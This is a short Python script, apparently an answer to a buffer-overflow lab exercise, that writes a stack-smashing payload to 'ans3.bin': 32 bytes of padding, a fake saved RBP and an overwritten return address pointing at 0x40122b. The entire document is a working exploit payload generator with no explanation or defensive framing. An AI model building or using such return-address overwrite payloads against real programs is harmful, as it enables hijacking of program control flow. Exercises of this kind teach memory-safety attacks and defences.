import struct

target_addr = 0x40122b 
fake_rbp = 0x7fffffffd000 
padding = b'A' * 32
payload = padding + struct.pack('<Q', fake_rbp) + struct.pack('<Q', target_addr)

with open("ans3.bin", "wb") as f:
    f.write(payload)

print(f"Payload written to ans3.bin.Fake RBP: {hex(fake_rbp)}, Target: {hex(target_addr)}")